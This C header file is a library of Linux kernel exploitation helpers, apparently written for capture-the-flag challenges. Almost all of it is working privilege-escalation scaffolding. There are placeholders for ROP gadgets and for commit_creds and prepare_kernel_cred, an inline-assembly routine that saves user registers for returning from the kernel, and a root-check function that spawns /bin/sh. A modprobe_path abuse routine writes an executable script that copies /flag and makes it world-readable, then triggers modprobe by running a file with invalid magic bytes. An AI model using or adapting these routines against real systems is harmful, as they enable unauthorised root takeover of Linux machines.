// inspired by the goat: https://github.com/n132/libx/blob/main/libx.c
#define _GNU_SOURCE
#ifndef LIBPWN_H
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <pthread.h>
#include <string.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <stdint.h>
#include <errno.h>
#include <stddef.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <assert.h>
#include <sys/timerfd.h>
#include <sys/resource.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <netinet/tcp.h>  // for SOL_TCP, TCP options
#include <sys/prctl.h>
#include <poll.h>
#include <sys/shm.h>

size_t kernel_base = 0xffffffff81000000;
#define KADDR(addr) ((size_t)(addr)-0xffffffff81000000 + kernel_base);
int fd, seq_fd;

#define TTYMAGIC                    0x5401
#define PIPE_NUM                    256
#define SOCKET_NUM                  0x20
#define NO_ASLR_BASE                0xffffffff81000000
#define CPU_ENTRY_AREA              0xfffffe0000000000
#define MSG_COPY                    040000

#define TTY_FILE                        "/dev/ptmx"  
#define DEFAULT_MODPROBE_TRIGGER        "/tmp/fake"
#define DEFAULT_EVIL_MODPROBE_PATH      "/tmp/pwn"

typedef unsigned long u64;
typedef unsigned int u32;
typedef unsigned short u16;
typedef unsigned char u8;

size_t commit_creds, prepare_kernel_cred, modprobe_path;
size_t swapgs_restore_regs_and_return_to_usermode;
size_t pop_rdi_ret, pop_rax_ret;
size_t write_rax_to_rdi;
size_t xchg_rdi_rax, mov_rdi_rax;
size_t user_cs, user_ss, user_rflags, user_sp, user_rsp;
size_t canary, leak;


void spawn_shell() {
    puts("[*] Hello from user land!");
    uid_t uid = getuid();
    if (uid == 0) {
        printf("[+] UID: %d, got root!\n", uid);
    } else {
        printf("[!] UID: %d, we root-less :(!\n", uid);
        exit(-1);
    }
    system("/bin/sh");
}



char *win_condition = "/home/user/w";
char *dummy_file = "/home/user/d";
char *res = "/home/user/flag";

struct stat st = {0};


void save_state() {
    __asm__(".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax");
    puts("[+] Saved state");
}

const char* arb_exec = 
"#!/bin/sh\n"
"cat /flag > /home/user/flag\n"
"chmod 777 /home/user/flag";

void abuse_modprobe() {
    puts("[+] Hello from user land!");
    if (stat("/home/user", &st) == -1) {
        puts("[*] Creating /home/user");
        int ret = mkdir("/home/user", S_IRWXU);
        if (ret == -1) {
            puts("[!] Failed");
            exit(-1);
        }
    }

    puts("[*] Setting up reading '/flag' as non-root user...");
    FILE *fptr = fopen(win_condition, "w");
    if (!fptr) {
        puts("[!] Failed to open win condition");
        exit(-1);
    }

    if (fputs(arb_exec, fptr) == EOF) {
        puts("[!] Failed to write win condition");
        exit(-1);
    }

    fclose(fptr);

    if (chmod(win_condition, S_IXUSR) < 0) {
        puts("[!] Failed to chmod win condition");
        exit(-1);
    };
    puts("[+] Wrote win condition -> /home/user/w");
    fptr = fopen(dummy_file, "w");
    if (!fptr) {
        puts("[!] Failed to open dummy file");
        exit(-1);
    }

    puts("[*] Writing dummy file...");
    if (fputs("\x37\x13\x42\x42", fptr) == EOF) {
        puts("[!] Failed to write dummy file");
        exit(-1);
    }
    fclose(fptr);
    
    if (chmod(dummy_file, S_ISUID|S_IXUSR) < 0) {
        puts("[!] Failed to chmod win condition");
        exit(-1);
    };
    puts("[+] Wrote modprobe trigger -> /home/user/d");

    puts("[*] Triggering modprobe by executing /home/user/d");
    execv(dummy_file, NULL);

    puts("[?] Hopefully GG");
    fptr = fopen(res, "r");
    if (!fptr) {
        puts("[!] Failed to open results file");
        exit(-1);
    }
    char *line = NULL;
    size_t len = 0;
    for (int i = 0; i < 8; i++) {
        uint64_t read = getline(&line, &len, fptr);
        printf("%s", line);
    }

    fclose(fptr);
}



void dump_hex(char *buf, size_t size){
 for(int i = 0; i < size/8; i++){
        printf("[+] %d - 0x%016lx\n", i, ((unsigned long *)buf)[i]);
  }
}


void ppause(){
    puts("enter to unpause");
    getchar();
}

void info(const char *msg, unsigned long val){
    printf("[INFO] %s: %p\n", msg, val);
}

void error(const char *msg){
    printf("[ERROR] %s\n", msg);
    exit(-1);
}


#endif /* LIBPWN_H */
